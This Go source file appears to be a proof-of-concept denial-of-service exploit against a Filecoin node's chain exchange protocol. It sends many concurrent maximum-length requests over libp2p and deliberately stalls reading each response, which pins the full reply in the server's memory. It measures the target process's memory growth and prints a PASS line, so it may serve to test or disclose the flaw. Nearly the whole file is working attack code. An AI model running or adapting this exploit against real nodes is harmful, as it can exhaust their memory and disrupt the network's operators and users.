package main

import (
	"bytes"
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/ipfs/go-cid"
	"github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/core/peerstore"
	"github.com/multiformats/go-multiaddr"
)

const chainExchangeProtocol = "/fil/chain/xchg/0.0.1"

/// max time to run attack before collecting results
const attackWindow = 70 * time.Second

/// encodeRequest builds CBOR-encoded chain exchange request
/// format matches chain/exchange/cbor_gen.go Request.MarshalCBOR
func encodeRequest(heads []cid.Cid, length, options uint64) []byte {
	var buf bytes.Buffer

	/// array(3)
	buf.WriteByte(0x83)

	/// heads: array of CIDs with tag 42 + null-prefixed bytes
	writeArrayHeader(&buf, len(heads))
	for _, c := range heads {
		buf.Write([]byte{0xd8, 0x2a}) /// tag(42)
		cidBytes := append([]byte{0x00}, c.Bytes()...)
		writeBytes(&buf, cidBytes)
	}

	/// length: uint64
	writeUint(&buf, length)

	/// options: uint64
	writeUint(&buf, options)

	return buf.Bytes()
}

func writeArrayHeader(w *bytes.Buffer, n int) {
	if n < 24 {
		w.WriteByte(0x80 | byte(n))
	} else if n < 256 {
		w.WriteByte(0x98)
		w.WriteByte(byte(n))
	} else {
		w.WriteByte(0x99)
		binary.Write(w, binary.BigEndian, uint16(n))
	}
}

func writeBytes(w *bytes.Buffer, data []byte) {
	n := len(data)
	if n < 24 {
		w.WriteByte(0x40 | byte(n))
	} else if n < 256 {
		w.WriteByte(0x58)
		w.WriteByte(byte(n))
	} else {
		w.WriteByte(0x59)
		binary.Write(w, binary.BigEndian, uint16(n))
	}
	w.Write(data)
}

func writeUint(w *bytes.Buffer, v uint64) {
	switch {
	case v < 24:
		w.WriteByte(byte(v))
	case v < 256:
		w.WriteByte(0x18)
		w.WriteByte(byte(v))
	case v < 65536:
		w.WriteByte(0x19)
		binary.Write(w, binary.BigEndian, uint16(v))
	case v < 4294967296:
		w.WriteByte(0x1a)
		binary.Write(w, binary.BigEndian, uint32(v))
	default:
		w.WriteByte(0x1b)
		binary.Write(w, binary.BigEndian, v)
	}
}

/// getChainHead fetches current tipset CIDs via JSON-RPC
func getChainHead(api string) ([]cid.Cid, error) {
	body := `{"jsonrpc":"2.0","method":"Filecoin.ChainHead","params":[],"id":1}`
	resp, err := http.Post(api, "application/json", strings.NewReader(body))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	data, _ := io.ReadAll(resp.Body)
	var res struct {
		Result struct {
			Cids []cid.Cid `json:"Cids"`
		} `json:"result"`
	}
	if err := json.Unmarshal(data, &res); err != nil {
		return nil, err
	}
	return res.Result.Cids, nil
}

/// getRSS reads VmRSS from /proc/<pid>/status
func getRSS(pid int) uint64 {
	if pid <= 0 {
		return 0
	}
	path := fmt.Sprintf("/proc/%d/status", pid)
	data, err := os.ReadFile(path)
	if err != nil {
		return 0
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "VmRSS:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				v, _ := strconv.ParseUint(fields[1], 10, 64)
				return v * 1024
			}
		}
	}
	return 0
}

/// debugRSS prints raw VmRSS line for verification
func debugRSS(pid int) {
	if pid <= 0 {
		return
	}
	path := fmt.Sprintf("/proc/%d/status", pid)
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Fprintf(os.Stderr, "debug: cannot read %s: %v\n", path, err)
		return
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "VmRSS:") {
			fmt.Fprintf(os.Stderr, "debug: %s\n", strings.TrimSpace(line))
			return
		}
	}
	fmt.Fprintf(os.Stderr, "debug: VmRSS not found in %s\n", path)
}

/// attackStream opens stream, sends max-length request, stalls read to pin server memory
/// returns true if stream was successfully opened and request sent
func attackStream(ctx context.Context, h host.Host, target peer.ID, req []byte, active *int64) bool {
	atomic.AddInt64(active, 1)
	defer atomic.AddInt64(active, -1)

	stream, err := h.NewStream(ctx, target, chainExchangeProtocol)
	if err != nil {
		return false
	}
	defer stream.Close()

	/// send request
	if _, err := stream.Write(req); err != nil {
		return false
	}
	stream.CloseWrite()

	/// stall read: 1 byte every 5s triggers TCP backpressure
	/// server goroutine blocks on write with 60s deadline, pinning full response in heap
	buf := make([]byte, 1)
	for {
		select {
		case <-ctx.Done():
			return true
		default:
		}
		stream.SetReadDeadline(time.Now().Add(10 * time.Second))
		if _, err := stream.Read(buf); err != nil {
			return true
		}
		time.Sleep(5 * time.Second)
	}
}

func main() {
	if len(os.Args) < 5 {
		fmt.Fprintf(os.Stderr, "usage: %s <api> <multiaddr> <peerid> <streams> [pid]\n", os.Args[0])
		os.Exit(1)
	}

	api := os.Args[1]
	addr := os.Args[2]
	peerStr := os.Args[3]
	numStreams, _ := strconv.Atoi(os.Args[4])
	pid := 0
	if len(os.Args) > 5 {
		pid, _ = strconv.Atoi(os.Args[5])
	}

	/// fetch valid chain head for request
	heads, err := getChainHead(api)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to get chain head: %v\n", err)
		os.Exit(1)
	}

	/// encode request once: Length=900 (MaxRequestLength), Options=3 (Headers|Messages)
	req := encodeRequest(heads, 900, 3)

	/// setup libp2p host
	priv, _, _ := crypto.GenerateKeyPair(crypto.Ed25519, -1)
	h, err := libp2p.New(libp2p.Identity(priv))
	if err != nil {
		fmt.Fprintf(os.Stderr, "libp2p: %v\n", err)
		os.Exit(1)
	}
	defer h.Close()

	/// connect to target
	ma, _ := multiaddr.NewMultiaddr(addr)
	target, _ := peer.Decode(peerStr)
	h.Peerstore().AddAddr(target, ma, peerstore.PermanentAddrTTL)

	ctx, cancel := context.WithTimeout(context.Background(), attackWindow)
	defer cancel()

	if err := h.Connect(ctx, peer.AddrInfo{ID: target, Addrs: []multiaddr.Multiaddr{ma}}); err != nil {
		fmt.Fprintf(os.Stderr, "connect: %v\n", err)
		os.Exit(1)
	}

	baseline := getRSS(pid)
	debugRSS(pid)

	/// memory monitor tracks peak RSS during attack
	var peak uint64
	var peakMu sync.Mutex
	done := make(chan struct{})

	go func() {
		tick := time.NewTicker(500 * time.Millisecond)
		defer tick.Stop()
		for {
			select {
			case <-tick.C:
				if rss := getRSS(pid); rss > 0 {
					peakMu.Lock()
					if rss > peak {
						peak = rss
					}
					peakMu.Unlock()
				}
			case <-done:
				return
			}
		}
	}()

	/// launch concurrent attack streams
	var wg sync.WaitGroup
	var active int64
	var successCount int64

	for i := 0; i < numStreams; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if attackStream(ctx, h, target, req, &active) {
				atomic.AddInt64(&successCount, 1)
			}
		}()
		/// slight stagger to avoid connection storm
		time.Sleep(10 * time.Millisecond)
	}

	/// wait for context timeout or all streams complete
	wg.Wait()
	close(done)

	/// collect final metrics
	peakMu.Lock()
	finalPeak := peak
	peakMu.Unlock()
	finalRSS := getRSS(pid)

	/// output results
	if pid > 0 && baseline > 0 {
		growthMB := int64(finalPeak-baseline) >> 20
		fmt.Printf("PASS: baseline_mb=%d peak_mb=%d final_mb=%d growth_mb=%d streams=%d success=%d\n",
			baseline>>20, finalPeak>>20, finalRSS>>20, growthMB, numStreams, successCount)
	} else {
		fmt.Printf("DONE: streams=%d success=%d\n", numStreams, successCount)
	}
}
